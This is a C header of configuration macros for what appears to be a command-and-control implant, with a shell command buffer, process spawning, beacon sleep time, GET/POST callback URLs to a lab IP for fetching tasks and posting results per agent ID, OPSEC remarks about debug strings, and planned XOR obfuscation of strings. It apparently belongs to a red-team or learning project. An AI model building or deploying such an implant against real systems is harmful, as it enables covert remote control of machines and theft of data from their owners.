#pragma once

/*
A set of macro settings for modifying behavior
*/

#ifndef PIPE_READ_SIZE_BUFFER
// How big of an output buffer to read from CLI when running CLI-based commands
// Applies to:
//   - shell
#define PIPE_READ_SIZE_BUFFER 1024
#endif // ? Fixed: No extra tokens

#ifndef CLI_INPUT_SIZE_BUFFER
// How big of an input a command-line command can be. If your command is bigger than CLI_INPUT_SIZE_BUFFER, it'll be cut off.
// Applies to:
//   - shell
#define CLI_INPUT_SIZE_BUFFER 4096
#endif // ? Fixed

#ifndef PROCESS_SPAWN_DIRECTORY
// What directory to run a new process from. Need to explicitly specify PROCESS_SPAWN_DIRECTORY for lpCurrentDirectory when calling WhisperCreateProcessA
// Applies to:
//   - shell
//   - Can be used for anything using WhisperCreateProcessA
#define PROCESS_SPAWN_DIRECTORY "C:\\"
#endif // ? Fixed

//================
// CALLBACK
//================

#ifndef CALLBACK_SLEEP_TIME
// Sleep time (seconds)
#define CALLBACK_SLEEP_TIME 60
#endif


#ifndef CALLBACK_HTTP_HOST
// IP/Hostname of Callback.
#define CALLBACK_HTTP_HOST "192.168.212.128"
#endif

#ifndef CALLBACK_HTTP_URL
// URL of callback host. seperate from HOST for formatting purposes.
// Applies to:
#define CALLBACK_HTTP_URL "http://192.168.212.128/"
#endif

#ifndef CALLBACK_HTTP_PORT
// What port to post back to
// Applies to:
#define CALLBACK_HTTP_PORT 9999
#endif

#ifndef CALLBACK_HTTP_GET_ENDPOINT
// GET request endpoint
// Applies to:
#define CALLBACK_HTTP_GET_ENDPOINT "/get/"
#endif

#ifndef CALLBACK_HTTP_FULL_GET_URL
// Full GET request URL with format specifier for dynamic agent_id injection
#define CALLBACK_HTTP_FULL_GET_URL "http://192.168.212.128:9999/get/%s"
#endif

#ifndef CALLBACK_HTTP_POST_ENDPOINT
// Endpoint to post HTTP requests back to
// Applies to:
//
#define CALLBACK_HTTP_POST_ENDPOINT "/post"
#endif

#ifndef CALLBACK_HTTP_FORMAT_POST_ENDPOINT
// Endpoint to post HTTP requests back to, format string
// Applies to:
//
#define CALLBACK_HTTP_FORMAT_POST_ENDPOINT "/post/%s"
#endif

#ifndef CALLBACK_HTTP_FULL_POST_URL
// Full GET request URL with format specifier for dynamic agent_id injection
#define CALLBACK_HTTP_FULL_POST_URL "http://192.168.212.128:9999/post/%s"
#endif

//================
// ENCRYPTION
//================
// currently unused
#ifndef ENCRYPTION_XOR_KEY
// Full GET request URL with format specifier for dynamic agent_id injection
#define ENCRYPTION_XOR_KEY 0x69 // maybe put like MACRO_ENCRYPTION_XOR_KEY then .replace in python
#endif

/*
idea:
 - macro replace the strings with an xor func,

 Ex: http://10.0.0.27:9999/post/%s >>

 # xor would return a string, or whatever is needed
 xor(http://10.0.0.27:9999/post/%s, KEY) 

 //might hit some type conflicts

 Then, its easy to macro in XOR, or some other encryption, etc

*/

//================
// DEBUG
//================
#define DEBUG_PRINT 1 // Set to 1 for debug mode, 0 to disable
// [OPSEC: If this is on (1), plaintext debug strings will be included in the binary]

// TLDR: ChatGPT magic to make a print debug macro
#if DEBUG_PRINT
#define DEBUG_LOG(fmt, ...) printf("[DEBUG] " fmt "", ##__VA_ARGS__)
#define DEBUG_LOGW(fmt, ...) wprintf(L"[DEBUG] " fmt L"", ##__VA_ARGS__)
#define DEBUG_LOGF(stream, fmt, ...) fprintf(stream, "[DEBUG] " fmt "", ##__VA_ARGS__)
#else
#define DEBUG_LOG(fmt, ...) // No-op (does nothing)
#define DEBUG_LOGW(fmt, ...) // No-op (does nothing)
#define DEBUG_LOGF(stream, fmt, ...) // No-op (does nothing)
#endif
